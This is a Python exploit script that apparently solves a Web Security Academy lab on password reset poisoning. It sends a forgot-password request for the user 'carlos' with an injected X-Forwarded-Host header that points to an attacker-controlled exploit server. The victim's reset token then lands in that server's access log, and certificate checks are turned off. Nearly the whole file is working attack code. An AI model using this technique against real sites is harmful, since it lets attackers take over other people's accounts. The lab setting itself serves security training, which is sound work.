import re
import ssl
import urllib.parse
import http.client

LAB_ID = "0aca003d04d84a3382b6c484003500bc"
EXPLOIT_SERVER_ID = "0a36005c04a34ae4825cc3db01d200d5"


def POST_forgotpassword() -> http.client.HTTPResponse:
    method, path = 'POST', '/forgot-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'x-forwarded-host': f"exploit-{EXPLOIT_SERVER_ID}.exploit-server.net",
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/forgot-password',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'username': 'carlos',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


response = POST_forgotpassword()
print(response.status)
print(response.headers)
print(response.read())
if response.status == 200:
    print("password reset link sent")
    print("find password reset link in exploit server access log")
